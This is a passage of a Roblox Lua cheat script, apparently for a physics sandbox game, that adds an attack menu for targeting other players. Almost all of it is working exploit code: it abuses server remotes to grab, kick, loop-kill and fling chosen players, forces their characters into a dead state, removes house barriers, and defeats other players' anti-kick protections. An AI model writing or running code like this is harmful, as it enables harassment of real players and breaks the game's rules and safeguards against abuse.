                        if UFO and UFO:FindFirstChild("Object") and UFO.Object:FindFirstChild("ObjectModel") and UFO.Object.ObjectModel:FindFirstChild("Body") then
                            StickyEvent:FireServer(Toy.StickyPart, UFO.Object.ObjectModel.Body, CFrame.new())
                            follow = UFO.Object:FindFirstChild("FollowThisPart")
                            if follow then
                                if follow:FindFirstChild("AlignOrientation") then follow.AlignOrientation.Enabled = false end
                                if follow:FindFirstChild("AlignPosition") then follow.AlignPosition.Enabled = false end
                            end
                        end
                    end
                end
            end
        end)
    end
})

Services.UserInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == GucciKeyCode then
        autogucci = not autogucci
    end
end)

AttackTargetGroupbox = Tabs.AttackTab:AddLeftGroupbox("Target & Actions", "target")
AttackMethodsGroupbox = Tabs.AttackTab:AddRightGroupbox("Loop Methods", "sword")
AttackExtrasGroupbox = Tabs.AttackTab:AddLeftGroupbox("Extras", "cog")

local function updateAttackPlayerList()
    currentPlayers = {}
    for _, player in ipairs(Services.Players:GetPlayers()) do
        if player ~= Services.LocalPlayer then
            table.insert(currentPlayers, player.DisplayName .. " (@" .. player.Name .. ")")
        end
    end
    table.sort(currentPlayers)
    return currentPlayers
end

local function getUsernameFromFormatted(formatted)
    username = formatted:match("%(@(.+)%)")
    return username
end

local function getTargetName()
    if targetDropdown and targetDropdown.Value and targetDropdown.Value ~= "" then
        return getUsernameFromFormatted(targetDropdown.Value)
    end
    return nil
end

AttackFuncs = {
    bringActive = false, bringTask = nil,
    kickActive = false, kickTask = nil,
    loopKickActive = false, loopKickTask = nil,
    bypassActive = false, bypassTask = nil,
    loopKickBlobActive = false, loopKickBlobTask = nil,
    blobKillActive = false, blobKillTask = nil,
    blobLockRunning = false, blobLockTask = nil,
    loopKillActive = false, loopKillTask = nil,
    ownershipKickActive = false, ownershipKickTask = nil,
    palletRagdollActive = false, palletRagdollTask = nil,
    snowballRagdollActive = false, snowballRagdollTask = nil,
    destroyGucciActive = false, destroyGucciTask = nil,
    antiAntiKickWDActive = false, antiAntiKickWDTask = nil,
    antiAntiKickClickActive = false, antiAntiKickClickTask = nil,
    antiAntiKickBypassActive = false, antiAntiKickBypassTask = nil,
}

local function FWC_A(obj, name, timeout)
    return obj:FindFirstChild(name) or obj:WaitForChild(name, timeout or 5)
end

local function sno_A(part)
    ge = Services.rs:FindFirstChild("GrabEvents")
    if ge then
        so = ge:FindFirstChild("SetNetworkOwner")
        if so then pcall(function() so:FireServer(part, part.CFrame) end) end
    end
end

local function blobKick_A(blob, tHRP, side, action)
    det = blob:FindFirstChild(side .. "Detector")
    if not det then return end
    weld = det:FindFirstChild(side .. "Weld")
    if not weld then return end
    scr = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
    if not scr then return end
    if action == "Grab" then
        g = scr:FindFirstChild("CreatureGrab")
        if g then g:FireServer(det, tHRP, weld) end
    elseif action == "Drop" then
        d = scr:FindFirstChild("CreatureDrop")
        if d then d:FireServer(weld, tHRP) end
    elseif action == "Release" then
        r = scr:FindFirstChild("CreatureRelease")
        if r then r:FireServer(weld, tHRP) end
    end
end

local function checkBlob()
    char = Services.LocalPlayer.Character
    if not char then return false end
    hum = FWC_A(char, "Humanoid")
    if not hum or not hum.SeatPart then
        return false
    end
    return true
end

local function checkTarget()
    tn = getTargetName()
    if not tn then
        return nil
    end
    return tn
end

local function getBlob()
    char = Services.LocalPlayer.Character
    if not char then return nil end
    hum = char:FindFirstChild("Humanoid")
    if hum and hum.SeatPart then
        if hum.SeatPart.Parent and hum.SeatPart.Parent.Name == "CreatureBlobman" then
            return hum.SeatPart.Parent
        end
    end
    return nil
end

local function BringOnce()
    tn = checkTarget()
    if not tn or not checkBlob() then return end
    target = Services.Players:FindFirstChild(tn)
    if not target or not target.Character then return end
    char = Services.LocalPlayer.Character
    hum = FWC_A(char, "Humanoid")
    hrp = FWC_A(char, "HumanoidRootPart")
    if not hum or not hrp then return end
    blob = hum.SeatPart and hum.SeatPart.Parent
    if not blob then return end
    tHRP = FWC_A(target.Character, "HumanoidRootPart")
    if not tHRP then return end
    Detector = blob:FindFirstChild("LeftDetector")
    Weld = Detector and Detector:FindFirstChild("LeftWeld")
    bs = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
    GrabRemote = bs and bs:FindFirstChild("CreatureGrab")
    if not Detector or not Weld or not GrabRemote then return end
    OrigPos = hrp.CFrame
    OrigTrans = {}
    for _, p in ipairs(char:GetDescendants()) do
        if p:IsA("BasePart") then
            OrigTrans[p] = p.Transparency
            p.Transparency = 1
        end
    end
    freshTHRP = FWC_A(target.Character, "HumanoidRootPart")
    if not freshTHRP then
        for p, t in pairs(OrigTrans) do if p and p.Parent then p.Transparency = t end end
        return
    end
    hrp.CFrame = freshTHRP.CFrame * CFrame.new(5, 0, 0)
    task.wait()
    if Aura then Aura.Enabled = true end
    grabSucceeded = false
    for i = 1, 5 do
        if hum.SeatPart and hum.SeatPart.Parent ~= blob then
            grabSucceeded = true
            break
        end
        freshTHRP = FWC_A(target.Character, "HumanoidRootPart")
        if not freshTHRP then break end
        pcall(function() GrabRemote:FireServer(Detector, freshTHRP, Weld) end)
        task.wait(0.06)
    end
    if hum.SeatPart and hum.SeatPart.Parent ~= blob then grabSucceeded = true end
    if Aura then Aura.Enabled = false end
    hrp.CFrame = OrigPos
    for p, t in pairs(OrigTrans) do if p and p.Parent then p.Transparency = t end end
    if grabSucceeded then
    else
    end
end

local function KickOnce()
    tn = checkTarget()
    if not tn or not checkBlob() then return end
    target = Services.Players:FindFirstChild(tn)
    if not target or not target.Character then return end
    plr = Services.LocalPlayer
    char = plr.Character
    hum = char:FindFirstChild("Humanoid")
    hrp = char:FindFirstChild("HumanoidRootPart")
    seat = hum and hum.SeatPart
    if not seat or seat.Parent.Name ~= "CreatureBlobman" then
        return
    end
    blob = seat.Parent
    blobRoot = blob:FindFirstChild("HumanoidRootPart") or blob.PrimaryPart
    bs = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
    if not bs then return end
    CG = bs:FindFirstChild("CreatureGrab")
    CD = bs:FindFirstChild("CreatureDrop")
    R_Det = blob:FindFirstChild("RightDetector")
    if not CG or not CD or not R_Det then return end
    GE = Services.rs.GrabEvents
    tChar = target.Character
    tRoot = tChar:FindFirstChild("HumanoidRootPart")
    tHum = tChar:FindFirstChild("Humanoid")
    if not tRoot or not tHum then return end
    existingWeld = R_Det:FindFirstChild("RightWeld") or R_Det:FindFirstChildWhichIsA("Weld")
    if existingWeld then
        CD:FireServer(existingWeld)
        task.wait(0.2)
    end
    savedPos = blobRoot.CFrame
    dragging = false
    grabStartTime = 0
    loopStartTime = tick()
    blobRoot.CFrame = tRoot.CFrame
    task.wait(0.1)
    while tick() - loopStartTime < 1 do
        ok, err = pcall(function()
            if not target or not target.Character then dragging = false; return end
            tRoot = target.Character:FindFirstChild("HumanoidRootPart")
            tHum = target.Character:FindFirstChild("Humanoid")
            if not tRoot or not tHum or tHum.Health <= 0 then dragging = false; return end
            pcall(function() tRoot.Velocity = Vector3.zero end)
            if not dragging then
                pcall(function() blobRoot.CFrame = tRoot.CFrame end)
                pcall(function() blobRoot.Velocity = Vector3.zero end)
                pcall(function()
                    tHum.PlatformStand = true
                    tHum.Sit = true
                    GE.SetNetworkOwner:FireServer(tRoot, blobRoot.CFrame)
                    GE.DestroyGrabLine:FireServer(tRoot)
                end)
                if grabStartTime == 0 then grabStartTime = tick() end
                if tick() - grabStartTime > 0.1 then
                    dragging = true
                    grabStartTime = 0
                    pcall(function() blobRoot.CFrame = savedPos end)
                    pcall(function() blobRoot.Velocity = Vector3.zero end)
                end
            else
                pcall(function() blobRoot.CFrame = savedPos end)
                pcall(function() blobRoot.Velocity = Vector3.zero end)
                lockPos = savedPos * CFrame.new(0, 23, 0)
                pcall(function() tRoot.CFrame = lockPos end)
                pcall(function() tHum.PlatformStand = true; tHum.Sit = true end)
                pcall(function()
                    GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                    GE.DestroyGrabLine:FireServer(tRoot)
                    weld = R_Det:FindFirstChild("RightWeld") or R_Det:FindFirstChildWhichIsA("Weld")
                    if weld then 
                        CG:FireServer(R_Det, tRoot, weld) 
                    else
                        CG:FireServer(R_Det, tRoot)
                    end
                end)
            end
        end)
        if not ok then dragging = false end
        Services.RunService.Heartbeat:Wait()
    end
    holdPos = savedPos * CFrame.new(0, 3, -5)
    pcall(function()
        tRoot.CFrame = holdPos
        tRoot.Velocity = Vector3.zero
        tRoot.RotVelocity = Vector3.zero
        tHum.PlatformStand = true
    end)
end

_G.Brkhs = false

function fbexp()
    cm(workspace, "ChildAdded", function(i)
        if _G.Brkhs then cm("fbexpconn", "disc") end
        if i.Name == "Part" and (i.Position - Vector3.new(263.4, -4.79, 466.8)).Magnitude <= 2 then
           _G.Brkhs = true
            notify("Note!", "Destroyed Houses Barrier")
            for _, i in pairs(workspace.Plots:GetChildren()) do
                for _, i in pairs(i.Barrier:GetChildren()) do
                    if i:IsA("BasePart") and i.CanCollide == true then
                        i.CanCollide = false
                    end
                end
            end
            cm("fbexpconn", "disc")
        end
    end, "fbexpconn")
end

function breakhouse(mode)
    if not mode then return end
    fbexp()
    timer("brkhs", 10)
    repeat
        SICF("BallSnowball", CFrame.new(263.5, -4.5, 486.9))
        repeat task.wait() until var("p").CanSpawnToy.Value
    until _G.Brkhs or not timer("brkhs")
end

local function BlobKillOnce()
    plr = Services.LocalPlayer
    char = plr.Character
    if not char then return end
    hum = char:FindFirstChild("Humanoid")
    hrp = char:FindFirstChild("HumanoidRootPart")
    if not hum or not hrp then return end
    Blob = hum.SeatPart and hum.SeatPart.Parent
    if not Blob or Blob.Name ~= "CreatureBlobman" then
        return
    end
    tn = getTargetName()
    if not tn then
        return
    end
    tt = Services.Players:FindFirstChild(tn)
    if not tt or not tt.Character then
        return
    end
    if not tt.Character:FindFirstChild("HumanoidRootPart") or tt.Character.Humanoid.Health == 0 then return end
    CD, CG = Blob.BlobmanSeatAndOwnerScript.CreatureRelease, Blob.BlobmanSeatAndOwnerScript.CreatureGrab
    pos = hrp.CFrame
    pcall(function()
        Blob.HumanoidRootPart.CFrame = tt.Character.HumanoidRootPart.CFrame
    end)
    task.wait(0.1)
    repeat
        task.wait()
        CG:FireServer(nil, tt.Character.HumanoidRootPart, Blob.RightDetector.RightWeld)
        CD:FireServer(Blob.RightDetector.RightWeld)
    until isnetworkowner(tt.Character.HumanoidRootPart)
    task.wait()
    tt.Character.Humanoid:ChangeState("Dead")
    pcall(function()
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
        Blob.HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
        Blob.HumanoidRootPart.AssemblyAngularVelocity = Vector3.zero
        Blob.HumanoidRootPart.CFrame = pos
    end)
end

local function BringLoop()
    while AttackFuncs.bringActive do BringOnce(); task.wait(1) end
end

local function KickLoop()
    while AttackFuncs.kickActive do KickOnce(); task.wait(1) end
end

function LoopKickFunc()
    while AttackFuncs.loopKickActive do
        tn = checkTarget()
        if not tn or not checkBlob() then 
            task.wait(0.5)
            continue 
        end
        target = Services.Players:FindFirstChild(tn)
        if not target or not target.Parent then 
            task.wait(0.5)
            continue 
        end
        char = Services.LocalPlayer.Character
        hum = char and char:FindFirstChild("Humanoid")
        seat = hum and hum.SeatPart
        hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not seat or not target or not target.Parent or not hrp then
            task.wait(0.5)
            continue
        end
        seatParent = seat.Parent
        grab = seatParent:FindFirstChild("BlobmanSeatAndOwnerScript") and seatParent.BlobmanSeatAndOwnerScript:FindFirstChild("CreatureGrab")
        drop = seatParent:FindFirstChild("BlobmanSeatAndOwnerScript") and seatParent.BlobmanSeatAndOwnerScript:FindFirstChild("CreatureDrop")
        if not grab or not drop then
            task.wait(0.5)
            continue
        end
        leftDet = seatParent:FindFirstChild("LeftDetector")
        rightDet = seatParent:FindFirstChild("RightDetector")
        leftWeld = leftDet and leftDet:FindFirstChild("LeftWeld")
        rightWeld = rightDet and rightDet:FindFirstChild("RightWeld")
        targetChar = target.Character
        targetHRP = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
        targetHum = targetChar and targetChar:FindFirstChild("Humanoid")
        if targetHRP and targetHum and targetHum.Health > 0 then
            grab:FireServer(leftDet, targetHRP, leftWeld)
            task.wait(0.3)
            centerPos = targetHRP.Position
            skyPos = Vector3.new(centerPos.X, 30, centerPos.Z)
            att0 = Instance.new("Attachment", targetHRP)
            alignPos = Instance.new("AlignPosition")
            alignPos.Attachment0 = att0
            alignPos.Mode = Enum.PositionAlignmentMode.OneAttachment
            alignPos.Position = skyPos
            alignPos.MaxForce = math.huge
            alignPos.Responsiveness = 200
            alignPos.Parent = targetHRP
            drop:FireServer(leftWeld, targetHRP)
            task.wait(0.1)
            grab:FireServer(leftDet, targetHRP, leftWeld)
            task.wait(0.2)
            blobHRP = seatParent:FindFirstChild("HumanoidRootPart") or seatParent:FindFirstChild("HRP") or seatParent:FindFirstChildWhichIsA("BasePart")
            if blobHRP then
                blobHRP.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                blobHRP.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
            end
            task.wait(0.1)
            spinStart = tick()
            spinSpeed = 100
            spinRadius = 15
            spinHeight = 30
            step = 0
            while AttackFuncs.loopKickActive and targetHRP and targetHRP.Parent and targetHum.Health > 0 do
                elapsed = tick() - spinStart
                spinAngle = elapsed * spinSpeed
                orbitX = skyPos.X + math.sin(spinAngle) * spinRadius
                orbitZ = skyPos.Z + math.cos(spinAngle) * spinRadius
                orbitPos = Vector3.new(orbitX, spinHeight, orbitZ)
                if blobHRP then
                    blobHRP.CFrame = CFrame.new(orbitPos, Vector3.new(skyPos.X, orbitPos.Y, skyPos.Z))
                end
                step = step + 1
                if step % 4 == 1 then
                    grab:FireServer(leftDet, targetHRP, leftWeld)
                elseif step % 4 == 2 then
                    drop:FireServer(leftWeld, targetHRP)
                elseif step % 4 == 3 then
                    grab:FireServer(rightDet, targetHRP, rightWeld)
                else
                    drop:FireServer(rightWeld, targetHRP)
                end
                game:GetService("RunService").Heartbeat:Wait()
            end
            if att0 and att0.Parent then att0:Destroy() end
            if alignPos and alignPos.Parent then alignPos:Destroy() end
        else
            task.wait(0.1)
        end
    end
    if att0 and att0.Parent then att0:Destroy() end
    if alignPos and alignPos.Parent then alignPos:Destroy() end
end

local function LoopKickBlobLoop()
    while AttackFuncs.loopKickBlobActive do
        tn = checkTarget()
        if not tn or not checkBlob() then task.wait(0.5); continue end
        plr = Services.LocalPlayer
        char = plr.Character
        hum = char and char:FindFirstChild("Humanoid")
        seat = hum and hum.SeatPart
        if not seat or seat.Parent.Name ~= "CreatureBlobman" then task.wait(0.5); continue end
        blob = seat.Parent
        blobRoot = blob:FindFirstChild("HumanoidRootPart") or blob.PrimaryPart
        bs = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
        if not bs then task.wait(0.5); continue end
        CG = bs:FindFirstChild("CreatureGrab")
        CD = bs:FindFirstChild("CreatureDrop")
        if not CG or not CD then task.wait(0.5); continue end
        R_Det = blob:FindFirstChild("RightDetector")
        if not R_Det then task.wait(0.5); continue end
        GE = Services.rs.GrabEvents
        local savedPos
        pcall(function()
            savedPos = blobRoot.CFrame
        end)
        if not savedPos then task.wait(0.5); continue end
        dragging = false
        grabStartTime = 0
        loopStart = tick()
        while AttackFuncs.loopKickBlobActive and tick() - loopStart < 5 do
            ok, err = pcall(function()
                target = Services.Players:FindFirstChild(tn)
                if not target or not target.Parent then 
                    dragging = false
                    grabStartTime = 0
                    return 
                end
                char = plr.Character
                hum = char and char:FindFirstChild("Humanoid")
                seat = hum and hum.SeatPart
                if not seat or not seat.Parent or seat.Parent.Name ~= "CreatureBlobman" then
                    dragging = false
                    grabStartTime = 0
                    return
                end
                blob = seat.Parent
                blobRoot = blob:FindFirstChild("HumanoidRootPart") or blob.PrimaryPart
                R_Det = blob:FindFirstChild("RightDetector")
                tChar = target.Character
                tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                tHum = tChar and tChar:FindFirstChild("Humanoid")
                if tRoot and tRoot.Parent and tHum and tHum.Health > 0 and blobRoot and R_Det then
                    pcall(function() tRoot.Velocity = Vector3.zero end)
                    if not dragging then
                        pcall(function() blobRoot.CFrame = tRoot.CFrame end)
                        pcall(function() blobRoot.Velocity = Vector3.zero end)
                        pcall(function()
                            tHum.PlatformStand = true
                            tHum.Sit = true
                            GE.SetNetworkOwner:FireServer(tRoot, blobRoot.CFrame)
                            GE.DestroyGrabLine:FireServer(tRoot)
                        end)
                        if grabStartTime == 0 then grabStartTime = tick() end
                        if tick() - grabStartTime > 0.1 then
                            dragging = true
                            grabStartTime = 0
                            pcall(function() blobRoot.CFrame = savedPos end)
                            pcall(function() blobRoot.Velocity = Vector3.zero end)
                        end
                    else
                        pcall(function() blobRoot.CFrame = savedPos end)
                        pcall(function() blobRoot.Velocity = Vector3.zero end)
                        lockPos = savedPos * CFrame.new(0, 23, 0)
                        pcall(function() tRoot.CFrame = lockPos end)
                        pcall(function() tHum.PlatformStand = true; tHum.Sit = true end)
                        pcall(function()
                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                            GE.DestroyGrabLine:FireServer(tRoot)
                            weld = R_Det:FindFirstChild("RightWeld") or R_Det:FindFirstChildWhichIsA("Weld")
                            if weld then 
                                CD:FireServer(weld)
                                CG:FireServer(R_Det, tRoot, weld) 
                            end
                        end)
                    end
                else
                    dragging = false
                    grabStartTime = 0
                end
            end)
            if not ok then 
                dragging = false
                grabStartTime = 0
            end
            Services.RunService.Heartbeat:Wait()
        end
        pcall(function()
            if blobRoot and blobRoot.Parent then
                blobRoot.CFrame = savedPos
                blobRoot.Velocity = Vector3.zero
            end
        end)
    end
end

local function BlobKillLoop()
    while AttackFuncs.blobKillActive do
        tn = getTargetName()
        if not tn then task.wait(0.5); continue end
        tt = Services.Players:FindFirstChild(tn)
        if not tt then task.wait(0.5); continue end
        plr = Services.LocalPlayer
        char = plr.Character
        if not char then task.wait(0.5); continue end
        hum = char:FindFirstChild("Humanoid")
        hrp = char:FindFirstChild("HumanoidRootPart")
        if not hum or not hrp then task.wait(0.5); continue end
        Blob = hum.SeatPart and hum.SeatPart.Parent
        if not Blob or Blob.Name ~= "CreatureBlobman" then task.wait(0.5); continue end
        if tt and tt.Character and tt.Character:FindFirstChild("HumanoidRootPart") and tt.Character.Humanoid.Health ~= 0 then
            CD, CG = Blob.BlobmanSeatAndOwnerScript.CreatureRelease, Blob.BlobmanSeatAndOwnerScript.CreatureGrab
            pos = hrp.CFrame
            pcall(function()
                Blob.HumanoidRootPart.CFrame = tt.Character.HumanoidRootPart.CFrame
            end)
            task.wait(0.1)
            repeat
                task.wait()
                CG:FireServer(nil, tt.Character.HumanoidRootPart, Blob.RightDetector.RightWeld)
                CD:FireServer(Blob.RightDetector.RightWeld)
            until isnetworkowner(tt.Character.HumanoidRootPart)
            task.wait()
            tt.Character.Humanoid:ChangeState("Dead")
            pcall(function()
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
                Blob.HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
                Blob.HumanoidRootPart.AssemblyAngularVelocity = Vector3.zero
                Blob.HumanoidRootPart.CFrame = pos
            end)
        end
        task.wait(0.05)
    end
end

BlobLock = { Running = false, Time = 0, LastTP = 0 }
function BlobLock:TPToTarget(tHRP)
    char = Services.LocalPlayer.Character
    if not char then return end
    hrp = FWC_A(char, "HumanoidRootPart", 2)
    if not hrp then return end
    sp = hrp.CFrame
    hrp.CFrame = tHRP.CFrame + Vector3.new(0, 5, 0)
    task.wait(0.05)
    for i = 1, 3 do sno_A(tHRP); task.wait() end
    task.wait(0.1)
    hrp.CFrame = sp
    self.LastTP = tick()
end
function BlobLock:Start()
    if self.Running then return end
    self.Running = true
    task.spawn(function()
        while self.Running do
            task.wait()
            tn = getTargetName()
            if not tn then self:Stop(); break end
            target = Services.Players:FindFirstChild(tn)
            if not target then self:Stop(); break end
            char = Services.LocalPlayer.Character
            if not char then continue end
            hrp = FWC_A(char, "HumanoidRootPart", 2)
            hum = FWC_A(char, "Humanoid", 2)
            if not hrp or not hum then continue end
            if not hum.SeatPart then self:Stop(); break end
            blob = hum.SeatPart.Parent
            tChar = target.Character
            if not tChar then continue end
            thum = FWC_A(tChar, "Humanoid", 2)
            tHRP = FWC_A(tChar, "HumanoidRootPart", 2)
            if not thum or not tHRP or thum.Health <= 0 then continue end
            dist = (hrp.Position - tHRP.Position).Magnitude
            if dist > 15 and tick() - self.LastTP > 0.5 then self:TPToTarget(tHRP) end
            if blob and blob.Parent then
                pcall(function()
                    if tick() - self.Time > 0.5 then thum.Sit = true; task.wait(0.16); thum.Sit = false; self.Time = tick() end
                    LD = blob:FindFirstChild("LeftDetector")
                    if LD then tHRP.CFrame = LD.CFrame end
                    for _, v in pairs(tChar:GetChildren()) do if v:IsA("BasePart") then v.Velocity = Vector3.new() end end
                    if dist < 40 and thum.SeatPart then sno_A(tHRP) end
                    blobKick_A(blob, tHRP, "Left", "Grab"); task.wait(0.005)
                    blobKick_A(blob, tHRP, "Left", "Release")
                end)
            end
        end
    end)
end
function BlobLock:Stop() self.Running = false end

local function LoopKillFunc()
    GE = Services.rs:WaitForChild("GrabEvents")
    plr = Services.LocalPlayer
    local function SNOWship(part)
        if not part or not part.Parent then return end
        char = plr.Character
        hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        dist = (hrp.Position - part.Position).Magnitude
        if dist <= 30 then
            pcall(function() GE.SetNetworkOwner:FireServer(part, GE.SetNetworkOwner) end)
        end
    end
    local function CheckNetworkOwner(player)
        if player and player.Character then
            head = player.Character:FindFirstChild("Head")
            if head and head:FindFirstChild("PartOwner") and head.PartOwner.Value == plr.Name then
                return true
            end
        end
    end
    local function CreateSkyVelocity(hrp)
        if hrp and not hrp:FindFirstChild("SkyVelocity") then
            bv = Instance.new("BodyVelocity", hrp)
            bv.Name = "SkyVelocity"
            bv.Velocity = Vector3.new(0, 100000000000000, 0)
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        end
    end
    local function getGrabRemote()
        char = plr.Character
        hum = char and char:FindFirstChildOfClass("Humanoid")
        blob = hum and hum.SeatPart and hum.SeatPart.Parent
        if not blob then return nil, nil, nil end
        Detector = blob:FindFirstChild("LeftDetector")
        Weld = Detector and Detector:FindFirstChild("LeftWeld")
        bs = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
        GrabRemote = bs and bs:FindFirstChild("CreatureGrab")
        if not Detector or not Weld or not GrabRemote then return nil, nil, nil end
        return GrabRemote, Detector, Weld
    end
    local function autoGrab(tHRP)
        if not tHRP then return end
        task.spawn(function()
            for i = 1, 3 do
                pcall(function() GE.CreateGrabLine:FireServer(tHRP) end)
                task.wait(0.06)
            end
        end)
    end
    savedPos = nil
    while AttackFuncs.loopKillActive do
        tn = getTargetName()
        if not tn then task.wait(1); continue end
        target = Services.Players:FindFirstChild(tn)
        if not target or not target.Parent or not target.Character then task.wait(0.5); continue end
        tChar = target.Character
        tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
        tHum = tChar and tChar:FindFirstChildOfClass("Humanoid")
        char = plr.Character
        hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not tRoot or not tHum or tHum.Health <= 0 or not hrp then task.wait(0.5); continue end
        inPlot = target:FindFirstChild("InPlot") and target.InPlot.Value
        isFloating = tHum.FloorMaterial == Enum.Material.Air
        if inPlot or isFloating then task.wait(0.5); continue end
        savedPos = hrp.CFrame
        for _ = 0, 50 do
            if not AttackFuncs.loopKillActive then break end
            pcall(function()
                for _, p in ipairs(char:GetDescendants()) do
                    if p:IsA("BasePart") then p.CanCollide = false end
                end
            end)
            SNOWship(tRoot)
            autoGrab(tRoot)
            if CheckNetworkOwner(target) or (tRoot and tRoot.AssemblyLinearVelocity.Magnitude > 500) then
                GE.DestroyGrabLine:FireServer(tRoot)
                CreateSkyVelocity(tRoot)
                break
            end
            task.wait()
            if tRoot and tRoot.Parent then
                if tRoot.Position.Y <= -12 then
                    hrp.CFrame = CFrame.new(tRoot.Position + Vector3.new(0, 5, -15))
                else
                    hrp.CFrame = CFrame.new(tRoot.Position + Vector3.new(0, -10, -10))
                end
                tHum.BreakJointsOnDeath = false
                tHum:ChangeState(Enum.HumanoidStateType.Dead)
                tHum.Jump = true
                tHum.Sit = false
            end
        end
        if hrp and hrp.Parent then
            hrp.CFrame = savedPos
            hrp.AssemblyLinearVelocity = Vector3.zero
        end
        task.wait(0.2)
    end
    pcall(function()
        char = plr.Character
        if char then
            for _, p in ipairs(char:GetDescendants()) do
                if p:IsA("BasePart") then p.CanCollide = true end
            end
        end
    end)
    if savedPos and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
        plr.Character.HumanoidRootPart.CFrame = savedPos
    end
end

var("paths", {
    Toys = var("ov").inv
})

cm(var("ov").inv, "ChildAdded", function(m)
    if m.Name ~= "BallSnowball" then return end
    if var("Toggle").Dstyed then
        var("Toggle").Dstyed = false
    end
    if var("Toggle").RagdollVal then
        timer("snbllch", 2)
        repeat task.wait() until not timer("snbllch") or not var("Toggle").RagdollVal
        if var("Toggle").RagdollVal and not var("Toggle").Dstyed then
            var("Remotes").dt:FireServer(inpast("BallSnowball"))
            var("Toggle").SragdollRn = false
        end
    end
end)

local function SnowballRagdollLoop(plr)
    if not plr then return end
    if var("Toggle").SragdollRn == true then return end
    if not inpast("BallSnowball") then SICF("BallSnowball", nil, "Head") end
    repeat task.wait() until inpast("BallSnowball") or not var("Toggle").RagdollVal
    ball = inpast("BallSnowball")
    if not ball then return end
    local ballConn
    ballConn = ball.Destroying:Connect(function()
        var("Toggle").Dstyed = true
        if ballConn then
            ballConn:Disconnect()
            ballConn = nil
        end
    end)
    repeat task.wait() until ball:FindFirstChild("SoundPart") or not ball.Parent or not var("Toggle").RagdollVal
    sp = ball:FindFirstChild("SoundPart")
    if not sp or not ball.Parent then return end
    if not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") then return end
    for i = 1, 5 do
        sno_A(sp)
        task.wait()
    end
    sp.CFrame = CFrame.new(plr.Character.Head.Position + Vector3.new(0, 10, 0))
    sp.AssemblyLinearVelocity = Vector3.new(0, -300, 0)
    var("Toggle").SragdollRn = true
    i = 0
    repeat
        i += 1
        csp = ball:FindFirstChild("SoundPart")
        if csp then
            sno_A(csp)
            csp.AssemblyLinearVelocity = Vector3.new(0, -300, 0)
        end
        task.wait()
    until i == 30 or not ball:FindFirstChild("SoundPart") or var("Toggle").SragdollRn == false
    var("Toggle").SragdollRn = false
    var("Toggle").Dstyed = false
    if inpast("BallSnowball") then
        var("Remotes").dt:FireServer(inpast("BallSnowball"))
        repeat task.wait() until not inpast("BallSnowball") or not var("Toggle").RagdollVal
    end
end

-- ============================================================================
--  ANTI-ANTIKICK  (E-Axum scriptinden portlandi: [WD] / [CLICK] / [BYPASS])
--  Not: eskiden burada olan "Remove Anti input / Remove Anti Kick" donguleri
--       kaldirildi, yerlerine bu ucu geldi.
-- ============================================================================
local function AAK_GetTarget()
    local tn = getTargetName()
    if not tn then return nil, nil, nil end
    local target = Services.Players:FindFirstChild(tn)
    if not target then return nil, nil, nil end
    local tChar = target.Character
    local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
    return target, tChar, tRoot
end

local function AAK_SpawnToy(ToyName)
    local me = Services.LocalPlayer
    if not me then return nil end
    if me:FindFirstChild("InPlot") and me.InPlot.Value and me:FindFirstChild("InOwnedPlot") and not me.InOwnedPlot.Value then
        local t0 = tick()
        while me.InPlot.Value and not me.InOwnedPlot.Value and tick() - t0 < 5 do task.wait() end
    end
    if me:FindFirstChild("CanSpawnToy") and not me.CanSpawnToy.Value then
        local t0 = tick()
        while not me.CanSpawnToy.Value and tick() - t0 < 5 do task.wait() end
    end
    local myHRP = getHRP()
    local Container = getInv()
    if not myHRP or not Container then return nil end
    local spawned = nil
    local conn
    conn = Container.ChildAdded:Connect(function(child)
        if child.Name == ToyName then
            spawned = child
        end
    end)
    task.spawn(function()
        pcall(function()
            Services.SpawnToy:InvokeServer(ToyName, myHRP.CFrame * CFrame.new(0, 14, 20), Vector3.zero)
        end)
    end)
    local t0 = tick()
    repeat task.wait() until spawned or (tick() - t0 > 2.5)
    if conn then pcall(function() conn:Disconnect() end) end
    return spawned
end

local function AAK_NoCollision(model)
    if not model then return end
    for _, part in pairs(model:GetDescendants()) do
        if part:IsA("BasePart") then
            part.CanCollide = false
            part.CanQuery = false
            part.CanTouch = false
        end
    end
end

local function AAK_ClearWDToy()
    local Container = getInv()
    if not Container then return end
    for _, v in pairs(Container:GetChildren()) do
        if v.Name == "SprayCanWD" or v.Name == "Anti-Antikick" then
            pcall(function() Services.DestroyToy:FireServer(v) end)
        end
    end
end

-- [WD] : SprayCanWD spawnlar, Hitbox'i kendine alir, SoundPart'ini hedefin
--        HRP'sine yapistirip sonra uzaaga park eder. Koprulu/wd antikickleri bozar.
local function AntiAntiKickWDFunc()
    while AttackFuncs.antiAntiKickWDActive do
        local _, _, tRoot = AAK_GetTarget()
        if not tRoot then
            task.wait(0.1)
            continue
        end
        local Container = getInv()
        local WD = Container and (Container:FindFirstChild("SprayCanWD") or Container:FindFirstChild("Anti-Antikick"))
        if not WD then
            WD = AAK_SpawnToy("SprayCanWD")
            if not WD then
                task.wait(0.25)
                continue
            end
            AAK_NoCollision(WD)
            pcall(function() WD.Name = "Anti-Antikick" end)
        end
        local SoundPart = WD:FindFirstChild("SoundPart")
